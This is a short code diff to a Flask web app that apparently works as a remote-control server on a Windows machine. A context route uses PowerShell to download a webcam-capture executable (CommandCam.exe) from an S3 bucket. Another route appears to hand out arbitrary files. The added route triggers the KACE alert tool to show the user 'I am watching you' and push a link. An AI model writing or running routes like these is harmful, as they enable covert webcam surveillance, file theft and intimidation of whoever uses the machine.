@@ -69,6 +69,11 @@ def getcam():
 	out = subprocess.check_output("powershell Invoke-WebRequest -URI https://s3-eu-west-1.amazonaws.com/flowertracker/CommandCam.exe -OutFile cc.exe")
 	return 'Webcam controller done.'
 
+@app.route('/scarykace')
+def scarykace():
+	out = subprocess.check_output("C:\Program Files (x86)\Quest\KACE\KUserAlert.exe -name='I am watching you' -message='Go to https://www.dilbert.com now'")
+	return "The king has spoken."
+
 @app.route('/getanyfile/', methods=['POST', 'GET'])
 def getanyfile():
 	if request.method == 'GET':
